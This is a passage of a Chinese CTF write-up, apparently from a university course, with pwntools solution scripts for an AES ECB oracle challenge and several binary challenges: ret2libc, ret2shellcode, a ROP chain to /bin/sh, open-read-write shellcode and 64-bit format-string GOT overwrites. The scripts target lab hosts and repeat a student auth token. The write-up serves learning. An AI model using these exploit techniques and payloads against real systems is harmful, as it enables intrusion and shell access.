hope you have a   wonderful  stay........</span><br><span class="line">No more of such vague formulae as The Right To Work  or To Each The Whole Result of his Labour.</span><br><span class="line">     What we proclaim   is The Right To Well-Being  Well-Being for All! - The Conquest of Bread</span><br><span class="line">Do you all think that this channel has been breached? Nah our leland univ crypto guy is top of</span><br><span class="line">In this mode  the initial vector IV is repeatedly encrypted to obtain a set of values Zi as fol</span><br><span class="line">Im sorry Mario, but CONTOSO PRINCESS is in a different forest! - SwiftOnSecurity Tay 2015-03-29</span><br><span class="line">At one point I was debating whether or not to add the UCBMFKLT copypasta on here but I have too</span><br><span class="line">much self respect. Making random lorem ipsum is actually a lot harder than one would think tbh</span><br><span class="line">ACTF.womenfenshouba,woranggeikira.</span><br><span class="line">'''</span></span><br></pre></td></tr></table></figure>
<hr>
<h5 id="lovely-aes1"><a class="header-anchor" href="#lovely-aes1">¶</a>Lovely AES1</h5>
<p>我们每次可以求 a+input+b+secret 的 aes 值，而题目的 aes 是 16 个一块加密的，块与块之间不影响。于是可以构造 input 使得密文中的某一块是每次仅有一位未知的 secret 位加上已知明文组成的，于是就可以暴力。至于暴力的方法则是构造 input 使得 已知明文+暴力枚举位 是单独的一块。<br>
最多跑 19*256 次，很不错。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">auth=<span class="string">'3180103367.4124bb15c1dad3091d08fdab64d5c43d'</span></span><br><span class="line">sh=remote(<span class="string">"10.214.24.188"</span>,<span class="number">13370</span>)</span><br><span class="line">sh.sendline(auth)</span><br><span class="line">sh.recvrepeat(timeout = <span class="number">1</span>)</span><br><span class="line"><span class="comment">#sh=process('./challenge1.py')</span></span><br><span class="line">sh.recvrepeat(timeout = <span class="number">1</span>)</span><br><span class="line">sec=<span class="string">''</span></span><br><span class="line">a=<span class="string">'Your name:'</span></span><br><span class="line">c=<span class="string">'Your secret:'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enc</span><span class="params">(str)</span>:</span></span><br><span class="line">    pad=(<span class="number">16</span>-len(a))*<span class="string">'a'</span>+str</span><br><span class="line">    sh.sendline(<span class="string">'Get secret'</span>.encode(<span class="string">'hex'</span>))</span><br><span class="line">    sh.recvuntil(<span class="string">"Your name: "</span>)</span><br><span class="line">    sh.sendline(pad.encode(<span class="string">'hex'</span>))</span><br><span class="line">    tret=sh.recv()</span><br><span class="line">    tret=tret[:len(tret)].decode(<span class="string">'hex'</span>)</span><br><span class="line">    <span class="comment">#tret[16:16*2].encode('hex')</span></span><br><span class="line">    <span class="keyword">return</span> tret[<span class="number">16</span>:<span class="number">16</span>*<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">    b=(<span class="number">48</span>-len(a+c)-i)*<span class="string">'0'</span></span><br><span class="line">    sh.sendline(<span class="string">'Get secret'</span>.encode(<span class="string">'hex'</span>))</span><br><span class="line">    sh.recvuntil(<span class="string">"Your name: "</span>)</span><br><span class="line">    sh.sendline(b.encode(<span class="string">'hex'</span>))</span><br><span class="line">    ret=sh.recv()</span><br><span class="line">    ret=ret[:len(ret)].decode(<span class="string">'hex'</span>)</span><br><span class="line">    <span class="keyword">print</span> ret[<span class="number">16</span>*<span class="number">2</span>:<span class="number">16</span>*<span class="number">3</span>].encode(<span class="string">'hex'</span>)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">256</span>):</span><br><span class="line">        <span class="keyword">if</span> enc((a+b+c+sec+chr(j))[<span class="number">16</span>*<span class="number">2</span>:<span class="number">16</span>*<span class="number">3</span>])==ret[<span class="number">16</span>*<span class="number">2</span>:<span class="number">16</span>*<span class="number">3</span>]:</span><br><span class="line">            sec+=chr(j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> sec</span><br><span class="line"></span><br><span class="line">sh.sendline(<span class="string">'Get flag'</span>.encode(<span class="string">'hex'</span>))</span><br><span class="line">sh.sendline(sec.encode(<span class="string">'hex'</span>))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="pwnable"><a class="header-anchor" href="#pwnable">¶</a>Pwnable</h2>
<h5 id="baby-bof"><a class="header-anchor" href="#baby-bof">¶</a>baby bof</h5>
<p>字符串溢出。<br>
用 ida 打开计算 offset 得到 padding 长度<br>
注意小端序</p>
<hr>
<h5 id="baby-ret2lib"><a class="header-anchor" href="#baby-ret2lib">¶</a>baby ret2lib</h5>
<p>根据题给 so 文件求 offset<br>
题目程序给你一次读地址的机会，读 got 表中的数据即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'''</span><br><span class="line">.got.plt:0804A01C off_804A01C     dd offset puts //134520860</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.text:0005F140                 public puts ; weak</span><br><span class="line"></span><br><span class="line">.text:0003A940                 public system ; weak</span><br><span class="line"></span><br><span class="line">0015902B			'/bin/sh'</span><br><span class="line">'''</span></span><br><span class="line"></span><br><span class="line">auth=<span class="string">'3180103367.4124bb15c1dad3091d08fdab64d5c43d'</span></span><br><span class="line">sh=remote(<span class="string">"10.214.10.18"</span>,<span class="number">11523</span>)</span><br><span class="line">sh.recvrepeat(timeout = <span class="number">1</span>)</span><br><span class="line">sh.sendline(auth)</span><br><span class="line">sh.recvrepeat(timeout = <span class="number">1</span>)</span><br><span class="line">sh.sendline(<span class="string">'134520860'</span>)</span><br><span class="line">sh.recvrepeat(timeout = <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">puts=<span class="number">0xf7e52140</span> <span class="comment">#from remote</span></span><br><span class="line"></span><br><span class="line">binsh_addr = puts-<span class="number">0x0005F140</span>+<span class="number">0x0015902B</span></span><br><span class="line">system_plt = puts-<span class="number">0x0005F140</span>+<span class="number">0x0003A940</span></span><br><span class="line"></span><br><span class="line">payload = flat([<span class="string">'a'</span> * <span class="number">0x3c</span>, system_plt, <span class="string">'b'</span> * <span class="number">4</span>, binsh_addr])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<hr>
<h5 id="baby-ret2sc"><a class="header-anchor" href="#baby-ret2sc">¶</a>baby ret2sc</h5>
<p>我以为是 ret2systemcall 结果找不到 gadgets<br>
checksec 发现 NX 未开启，输入又是输入到全局变量里的<br>
机智的我把 gadgets 输进去然后用 ret2systemcall 操作做<br>
后来才意识到是 ret2shellcode ，没必要兜圈子。<br>
罢了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'''</span><br><span class="line">0x0015902b /bin/sh</span><br><span class="line">0x0003A940</span><br><span class="line"></span><br><span class="line">.bss:0804A060 pop     eax</span><br><span class="line">.bss:0804A061 retn</span><br><span class="line">.bss:0804A062 ; ---------------------------------------------------------------------------</span><br><span class="line">.bss:0804A062 pop     edx</span><br><span class="line">.bss:0804A063 pop     ecx</span><br><span class="line">.bss:0804A064 pop     ebx</span><br><span class="line">.bss:0804A065 retn</span><br><span class="line">.bss:0804A066 ; ---------------------------------------------------------------------------</span><br><span class="line">.bss:0804A066 int     80h                             ; LINUX -</span><br><span class="line">.bss:0804A066 ; ---------------------------------------------------------------------------</span><br><span class="line">.bss:0804A068 db    0</span><br><span class="line"></span><br><span class="line">.bss:0804A060 name [50]</span><br><span class="line"></span><br><span class="line">/bin/sh		// 0x0804A060</span><br><span class="line"></span><br><span class="line">\x58		// pop eax  0x0804A068</span><br><span class="line">\xc3		// ret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">\x5a		// pop edx  0x0804A06A</span><br><span class="line">\x59		// pop ecx  </span><br><span class="line">\x5b		// pop ebx  </span><br><span class="line">\xc3		// ret</span><br><span class="line"></span><br><span class="line">\xcd\x80	// int 80h  0x0804A06E</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">----------------------------------------------------------</span><br><span class="line">'''</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">name=<span class="string">'/bin/sh\0\x58\xc3\x5a\x59\x5b\xc3\xcd\x80'</span>+<span class="string">'\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0'</span></span><br><span class="line">auth=<span class="string">'3180103367.4124bb15c1dad3091d08fdab64d5c43d'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh=remote(<span class="string">"10.214.10.18"</span>,<span class="number">11782</span>)</span><br><span class="line"></span><br><span class="line">sh.recvrepeat(timeout = <span class="number">1</span>)</span><br><span class="line">sh.sendline(auth)</span><br><span class="line"></span><br><span class="line">sh.recvrepeat(timeout = <span class="number">1</span>)</span><br><span class="line">sh.sendline(name)</span><br><span class="line">sh.recvrepeat(timeout = <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">pop_eax_ret = <span class="number">0x0804A068</span></span><br><span class="line">pop_edx_ecx_ebx_ret = <span class="number">0x0804A06A</span></span><br><span class="line">int_0x80 = <span class="number">0x0804A06E</span></span><br><span class="line">binsh = <span class="number">0x0804A060</span></span><br><span class="line"></span><br><span class="line">payload = flat([<span class="string">'A'</span> * (<span class="number">0x4</span>+<span class="number">0x14</span>+<span class="number">8</span>), pop_eax_ret, <span class="number">0xb</span>, pop_edx_ecx_ebx_ret, <span class="number">0</span>, <span class="number">0</span>, binsh, int_0x80])</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<hr>
<h5 id="baby-rop"><a class="header-anchor" href="#baby-rop">¶</a>baby rop</h5>
<p>静态链接，ROPgadget --ropchain 一梭子<br>
才怪，要修改一下，太长了，还要截断<br>
最后的结果</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line">auth=<span class="string">'3180103367.4124bb15c1dad3091d08fdab64d5c43d'</span></span><br><span class="line">main_addr=<span class="number">0x08048E24</span></span><br><span class="line"></span><br><span class="line">sh=remote(<span class="string">"10.214.10.18"</span>,<span class="number">11863</span>)</span><br><span class="line">sh.recvrepeat(timeout = <span class="number">1</span>)</span><br><span class="line">sh.sendline(auth)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#sh=process('./baby_rop')</span></span><br><span class="line">sh.recvrepeat(timeout = <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = <span class="string">''</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806e82a</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080bae06</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">p += <span class="string">'/bin'</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0809a15d</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806e82a</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea064</span>) <span class="comment"># @ .data + 4</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080bae06</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">p += <span class="string">'//sh'</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0809a15d</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806e82a</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x08054250</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0809a15d</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += p32(main_addr)</span><br><span class="line">payload=<span class="string">"A"</span>*<span class="number">32</span>+p</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvrepeat(timeout = <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p = <span class="string">''</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080481c9</span>) <span class="comment"># pop ebx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806e851</span>) <span class="comment"># pop ecx ; pop ebx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea060</span>) <span class="comment"># padding without overwrite ebx</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806e82a</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0808f720</span>) <span class="comment"># mov eax, 7 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0808F6A0</span>) <span class="comment"># add eax, 3 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b27f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080493e1</span>) <span class="comment"># int 0x80</span></span><br><span class="line">payload=<span class="string">"A"</span>*<span class="number">28</span>+p</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvrepeat(timeout = <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<hr>
<h5 id="orw"><a class="header-anchor" href="#orw">¶</a>orw</h5>
<p>标准 orw<br>
找个别人的 payload 改改都能过</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">auth=<span class="string">'3180103367.4124bb15c1dad3091d08fdab64d5c43d'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#('SuperLo0000000000000ngFlagggggggggggggggggggggggName.txt'[::-1]).encode('hex')</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">"xor ecx,ecx;push ecx;"</span></span><br><span class="line">shellcode = shellcode + <span class="string">"push 0x7478742e;push 0x656d614e;push 0x67676767;push 0x67676767;push 0x67676767;push 0x67676767;push 0x67676767;push 0x67676761;push 0x6c46676e;push 0x30303030;push 0x30303030;push 0x30303030;push 0x306f4c72;push 0x65707553;;"</span></span><br><span class="line">shellcode = shellcode + <span class="string">"mov ebx,esp;xor edx,edx;mov eax,0x5;int 0x80;mov ebx,eax;mov ecx,esp;mov edx,0x30;mov eax,0x3;int 0x80;mov eax,0x4;mov ebx,0x1;mov edx,0x30;int 0x80"</span></span><br><span class="line"></span><br><span class="line">payload = asm(shellcode)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh=remote(<span class="string">"10.214.10.18"</span>,<span class="number">13647</span>)</span><br><span class="line"></span><br><span class="line">sh.recvrepeat(timeout = <span class="number">1</span>)</span><br><span class="line">sh.sendline(auth)</span><br><span class="line"></span><br><span class="line"><span class="comment">#sh=process('./orw')</span></span><br><span class="line">sh.recvrepeat(timeout = <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<p>pwn 库好文明</p>
<hr>
<h5 id="fsb-easy"><a class="header-anchor" href="#fsb-easy">¶</a>fsb easy</h5>
<p>64 位的格式化字符串漏洞<br>
需要一次性写入 &amp; 写入地址需放最后防止被截断<br>
<code>payload='a%4196552c%8$lln\x18\x10\x60\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'</code></p>
<hr>
<h5 id="fsb-inf"><a class="header-anchor" href="#fsb-inf">¶</a>fsb inf</h5>
<p>64 位的格式化字符串漏洞<br>
有很多次循环<br>
我是先读取got表，再根据末三位地址搜索得到服务器所用 libc 库<br>
有了 libc 库就能得到别的函数的偏移，以及 onegadget 一键获取 shell<br>
但是 gadget_addr 太大了，一次写不完<br>
思路：先 一字节一字节 把 exit 的 got 表修改到 gadget_addr ，最后一次一步将 printf_got 改成 call exit 的地址，实现跳转</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">fsb=ELF(<span class="string">'./fsb_inf'</span>)</span><br><span class="line"></span><br><span class="line">auth=<span class="string">'3180103367.4124bb15c1dad3091d08fdab64d5c43d'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#sleep(5)</span></span><br><span class="line">sh=remote(<span class="string">"10.214.10.18"</span>,<span class="number">17526</span>)</span><br><span class="line">sh.sendline(auth)</span><br><span class="line"></span><br><span class="line"><span class="comment">#sh=process('./fsb_inf')</span></span><br><span class="line">sh.recvrepeat(timeout = <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">puts_got = fsb.got[<span class="string">'puts'</span>]</span><br><span class="line">printf_got = fsb.got[<span class="string">'printf'</span>]</span><br><span class="line">ext_got = fsb.got[<span class="string">'exit'</span>]</span><br><span class="line"></span><br><span class="line">p1=<span class="string">'AAAA%7$s'</span>+p64(puts_got)</span><br><span class="line">sh.sendline(p1)</span><br><span class="line">ret1=sh.recv(timeout = <span class="number">1</span>)</span><br><span class="line">ret1=ret1[<span class="number">4</span>:ret1.find(<span class="string">'\n'</span>)-<span class="number">3</span>]</span><br><span class="line">puts_addr=u64(ret1+<span class="string">'\0'</span>*(<span class="number">8</span>-len(ret1)))</span><br><span class="line"><span class="keyword">print</span> puts_addr</span><br><span class="line"></span><br><span class="line">puts_offset = <span class="number">0x06f690</span> <span class="comment">#https://libc.blukat.me/?q=puts%3A690&amp;l=libc6_2.23-0ubuntu10_amd64</span></span><br><span class="line">gadget_offset = <span class="number">0x45216</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#puts_offset = 0x071910</span></span><br><span class="line"><span class="comment">#gadget_offset = 0x4484f</span></span><br><span class="line"></span><br><span class="line">gadget_addr = puts_addr - puts_offset + gadget_offset</span><br><span class="line"></span><br><span class="line">psize=gadget_addr&amp;<span class="number">0xffffff</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">    payload =<span class="string">''</span></span><br><span class="line">    <span class="keyword">if</span>(ord(p64(gadget_addr)[i])!=<span class="number">0</span>):</span><br><span class="line">        payload =<span class="string">'%'</span>+str(ord(p64(gadget_addr)[i]))+<span class="string">'c'</span></span><br><span class="line">    payload +=<span class="string">'%9$hhn'</span></span><br><span class="line">    payload +=<span class="string">'A'</span>*(<span class="number">24</span>-len(payload))</span><br><span class="line">    payload += p64(ext_got+i)</span><br><span class="line">    print(payload)</span><br><span class="line">    sh.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload =<span class="string">'%999999c%999999c%999999c%999999c%196084c'</span></span><br><span class="line">payload +=<span class="string">'%13$lln'</span></span><br><span class="line">payload +=<span class="string">'A'</span>*(<span class="number">7</span>*<span class="number">8</span>-len(payload))</span><br><span class="line">payload += p64(printf_got)</span><br><span class="line">print(payload)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.sendline(<span class="string">'\x00'</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<hr>
<h5 id="fsb-one"><a class="header-anchor" href="#fsb-one">¶</a>fsb one</h5>
<p>和 fsb inf 几乎完全一致，只不过一开始就要把 puts 的 got 指向<br>
然后这回获取原函数地址我是通过 setvbuf<br>
其他没了，注意 puts 没有输出了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">fsb=ELF(<span class="string">'./fsb_one'</span>)</span><br><span class="line"></span><br><span class="line">auth=<span class="string">'3180103367.4124bb15c1dad3091d08fdab64d5c43d'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#sleep(5)</span></span><br><span class="line"><span class="comment">#sh=remote("10.214.10.18",18422)</span></span><br><span class="line"><span class="comment">#sh.sendline(auth)</span></span><br><span class="line"></span><br><span class="line">sh=process(<span class="string">'./fsb_one'</span>)</span><br><span class="line">sh.recvrepeat(timeout = <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">puts_got = fsb.got[<span class="string">'puts'</span>]</span><br><span class="line">printf_got = fsb.got[<span class="string">'printf'</span>]</span><br><span class="line">setvbuf_got = fsb.got[<span class="string">'setvbuf'</span>]</span><br><span class="line">ext_got = fsb.got[<span class="string">'exit'</span>]</span><br><span class="line"></span><br><span class="line">payload =<span class="string">'%999999c%999999c%999999c%999999c%196748‬c'</span></span><br><span class="line">payload +=<span class="string">'%13$lln'</span></span><br><span class="line">payload +=<span class="string">'A'</span>*(<span class="number">7</span>*<span class="number">8</span>-len(payload))</span><br><span class="line">payload += p64(puts_got)</span><br><span class="line">print(payload)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p1=<span class="string">'AAAA%7$s'</span>+p64(setvbuf_got)</span><br><span class="line">sh.sendline(p1)</span><br><span class="line">ret1=sh.recv(timeout = <span class="number">1</span>)</span><br><span class="line">ret1=ret1[<span class="number">4</span>:ret1.find(<span class="string">'\n'</span>)-<span class="number">3</span>]</span><br><span class="line">setvbuf_addr=u64(ret1+<span 